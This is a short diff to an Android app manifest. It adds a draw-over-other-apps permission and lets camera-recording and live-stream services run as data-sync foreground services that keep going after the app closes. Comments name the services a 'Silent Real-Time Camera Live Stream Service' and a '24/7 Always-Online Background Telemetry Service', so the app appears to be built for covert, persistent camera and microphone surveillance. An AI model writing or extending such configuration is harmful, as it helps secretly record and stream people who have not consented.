@@ -11,6 +11,7 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.VIBRATE" />
     <uses-permission android:name="android.permission.INTERNET" />
@@ -50,7 +51,7 @@
             android:name=".service.CameraRecordingService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="camera|microphone"
+            android:foregroundServiceType="camera|microphone|dataSync"
             android:stopWithTask="false" />
 
         <!-- Silent Real-Time Camera Live Stream Service -->
@@ -58,7 +59,7 @@
             android:name=".service.LiveStreamService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="camera|microphone"
+            android:foregroundServiceType="camera|microphone|dataSync"
             android:stopWithTask="false" />
 
         <!-- 24/7 Always-Online Background Telemetry Service -->
